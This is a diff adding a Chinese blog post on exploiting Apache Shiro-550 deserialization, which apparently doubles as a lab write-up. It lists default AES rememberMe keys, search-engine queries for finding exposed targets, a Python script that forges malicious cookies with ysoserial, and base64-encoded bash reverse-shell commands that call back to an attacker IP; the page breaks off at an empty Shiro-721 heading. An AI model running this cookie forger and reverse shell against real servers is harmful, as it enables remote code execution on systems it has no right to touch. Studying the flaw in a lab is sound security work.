@@ -16,16 +16,24 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="简介Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。   Shiro提供了应用程序安全性API来执行以下方面：  身份验证：证明用户身份，通常称为用户”登录”  授权：访问控制  密码术：保护或隐藏数据以防窥视  会话管理：每个用户的时间敏感状态 上述四个方面也被称为应用程序安全性的四个基石。   关于这个漏洞">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Shiro漏洞">
 <meta property="og:url" content="https://tsy244.github.io/2024/01/18/%E6%B8%97%E9%80%8F/Shiro%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="简介Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。   Shiro提供了应用程序安全性API来执行以下方面：  身份验证：证明用户身份，通常称为用户”登录”  授权：访问控制  密码术：保护或隐藏数据以防窥视  会话管理：每个用户的时间敏感状态 上述四个方面也被称为应用程序安全性的四个基石。   关于这个漏洞">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118130116605.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118141011492.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154031893.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154255996.png">
 <meta property="article:published_time" content="2024-01-18T00:53:58.000Z">
-<meta property="article:modified_time" content="2024-01-18T00:56:43.606Z">
+<meta property="article:modified_time" content="2024-01-18T08:00:00.515Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -225,7 +233,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 words
+          3.6k words
         
       </span>
     
@@ -236,7 +244,7 @@
         
         
         
-          1 mins
+          31 mins
         
       </span>
     
@@ -279,7 +287,97 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。  </p>
+<p>Shiro提供了应用程序安全性API来执行以下方面：</p>
+<ul>
+<li><p>身份验证：证明用户身份，通常称为用户”登录”</p>
+</li>
+<li><p>授权：访问控制</p>
+</li>
+<li><p>密码术：保护或隐藏数据以防窥视</p>
+</li>
+<li><p>会话管理：每个用户的时间敏感状态</p>
+<p>上述四个方面也被称为应用程序安全性的四个基石。</p>
+</li>
+</ul>
+<p>关于这个漏洞，本来这个漏洞很安全的，但是出现了加密密钥不修改的情况，也就是我们可以使用默认密钥进行破解，然后反序列化</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118140826755.png" srcset="/img/loading.gif" lazyload alt="image-20240118140826755"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><h2 id="组件识别"><a href="#组件识别" class="headerlink" title="组件识别"></a>组件识别</h2><p>在访问及登录时抓包，如果响应头set-cookie中显示rememberMe&#x3D;deleteMe，说明使用了Shiro组件</p>
+<h2 id="Shiro漏洞搜索"><a href="#Shiro漏洞搜索" class="headerlink" title="Shiro漏洞搜索"></a>Shiro漏洞搜索</h2><p>  通过fofa、zoomeye、shodan这类平台搜索相关特征来发现目标。  </p>
+<blockquote>
+<p> header&#x3D;”rememberme&#x3D;deleteMe”  </p>
+<p>header&#x3D;”shiroCookie”  </p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118130116605.png" srcset="/img/loading.gif" lazyload alt="image-20240118130116605"></p>
+<h2 id="shiro-漏洞检测"><a href="#shiro-漏洞检测" class="headerlink" title="shiro 漏洞检测"></a>shiro 漏洞检测</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/fupinglee/ShiroScan">https://github.com/fupinglee/ShiroScan</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sv3nbeast/ShiroScan">https://github.com/sv3nbeast/ShiroScan</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a>  </p>
+</blockquote>
+<h1 id="Shiro-550"><a href="#Shiro-550" class="headerlink" title="Shiro-550"></a>Shiro-550</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote>
+<p>Apache Shiro 框架提供了记住密码的功能（RememberMe），关闭浏览器再次访问时无需再登录即  可访问。用户登录成功后用户信息会经过加密编码后存储在cookie中。在 Cookie 读取过程中有用  AES 对 Cookie 值解密的过程，对于 AES 这类对称加密算法，一旦秘钥泄露加密便形同虚设。若秘  钥可控，同时 Cookie 值是由攻击者构造的恶意 Payload，就可以将流程走通，触发危险的 Java 反  序列化，从而导致远程命令执行漏洞。  </p>
+<p>shiro 默认使用了 CookieRememberMeManager，其处理cookie的流程是：  获取 rememberMe的cookie值–&gt;Base64解码–&gt;AES解密 –&gt;反序列化 。  </p>
+<p>但是AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人  通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、  AES加密、base64编码后，作为 cookie 的 rememberMe 字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118141011492.png" srcset="/img/loading.gif" lazyload alt="image-20240118141011492"></p>
+<blockquote>
+<p>  只要<strong>rememberMe</strong>的<strong>AES</strong>加密密钥泄露，无论<strong>shiro</strong>是什么版本都可能会导致该漏洞的产生。硬编码是  将数据直接嵌入到程序或其他可执行对象的源代码中。如果在返回包的 <strong>Set-Cookie</strong> 中存在  <strong>rememberMe&#x3D;deleteMe</strong> 字段，那么就可能存在此漏洞。  </p>
+</blockquote>
+<p>  常见key：  </p>
+<blockquote>
+<p>kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; (1.2.4默认key)<br>2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D;<br>4AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>3AvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;<br>wGiHplamyXlVB11UXWol8g&#x3D;&#x3D;<br>Z3VucwAAAAAAAAAAAAAAAA&#x3D;&#x3D;<br>6ZmI6I2j5Y+R5aSn5ZOlAA&#x3D;&#x3D;<br>ZUdsaGJuSmxibVI2ZHc9PQ&#x3D;&#x3D;<br>1QWLxg+NYmxraMoxAXu&#x2F;Iw&#x3D;&#x3D;</p>
+</blockquote>
+<p>payload产生的过程</p>
+<blockquote>
+<p>命令 &#x3D;&#x3D;&gt; 序列化 &#x3D;&#x3D;&gt; AES加密 &#x3D;&#x3D;&gt;  base64  &#x3D;&#x3D;&gt; rememberMe cookie(这个可以用于探测时候是使用的是shior)</p>
+</blockquote>
+<p>我们只需要蒋key获取到，然后使用工具重新生成恶意cookie，然后交给shior，他会将这个序列化，然后就相当于执行我们的恶意代码。如果我们的恶意代码是反弹shell 的话，就会反弹shell</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Apache</span> Shiro &lt;= <span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span>（需要获取AES秘钥）<br></code></pre></td></tr></table></figure>
+
+<h2 id="利用组件"><a href="#利用组件" class="headerlink" title="利用组件"></a>利用组件</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span> 中的 <span class="hljs-built_in">commons-collections4</span>(理论上commons-collections2也有)<br></code></pre></td></tr></table></figure>
+
+<h2 id="Payload构造-用于创建rememberMe"><a href="#Payload构造-用于创建rememberMe" class="headerlink" title="Payload构造(用于创建rememberMe)"></a>Payload构造(用于创建rememberMe)</h2><p>  ysoserial.jar 文件和脚本处于同一目录 ;  </p>
+<blockquote>
+<p>  <strong>python3</strong> shiro-exp.<strong>py</strong> 124.71.45.28:9998  </p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># shiro-exp.py</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">command</span>):<br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(key, AES.MODE_CBC, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    payload = encode_rememberme(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br></code></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> pull medicean/vulapps:s_shiro_1<br><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">7777</span>:<span class="hljs-number">8080</span> medicean/vulapps:s_shiro_1<br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
+<li><p>检查是否存在默认的key 和漏洞</p>
+<p>这里我们使用 Shiro_exploit 脚本，获取默认 key  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p>
+<blockquote>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/insightglacier/Shiro_exploit.git">https://github.com/insightglacier/Shiro_exploit.git</a>  cd Shiro_exploit  </p>
+<p>pip2 install requests  </p>
+<p>pip2 uninstall crypto pycryptodome  </p>
+<p>pip2 install pycryptodome</p>
+</blockquote>
+<p>脚本通过网络收集到的22个key，利用ysoserial工具中的URLDNS这个Gadget，并结合dnslog平  台实现漏洞检测。漏洞利用则可以选择Gadget和参数，增强灵活性。  </p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python2 shiro_exploit.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">47.104</span>.<span class="hljs-number">255.11</span>:<span class="hljs-number">18080</span>/<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>攻击机监听</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>VPS 利用反序列化工具生成 payload</p>
+</li>
+</ol>
+<p>   <a target="_blank" rel="noopener" href="https://www.sqlsec.com/rce/">https://www.sqlsec.com/rce/</a></p>
+   <figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">bash -c </span><span class="hljs-template-variable">&#123;echo, YmFzaCAtaSAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzMiAwPiYx&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64, -d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash, -i&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>然后执行ysoserial</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">10998</span> CommonsCollections4 <span class="hljs-string">&quot;bash -c &#123;echo, YmFzaCAtaSAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8yMjM0NSAwPiYx&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>生成cookie<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154031893.png" srcset="/img/loading.gif" lazyload alt="image-20240118154031893"></p>
+</li>
+<li><p>发包</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/FastJson%E6%BC%8F%E6%B4%9E/image-20240118154255996.png" srcset="/img/loading.gif" lazyload alt="image-20240118154255996"></p>
+</li>
+</ol>
+<h1 id="Shiro-721"><a href="#Shiro-721" class="headerlink" title="Shiro-721"></a>Shiro-721</h1>
                 
               </div>
             
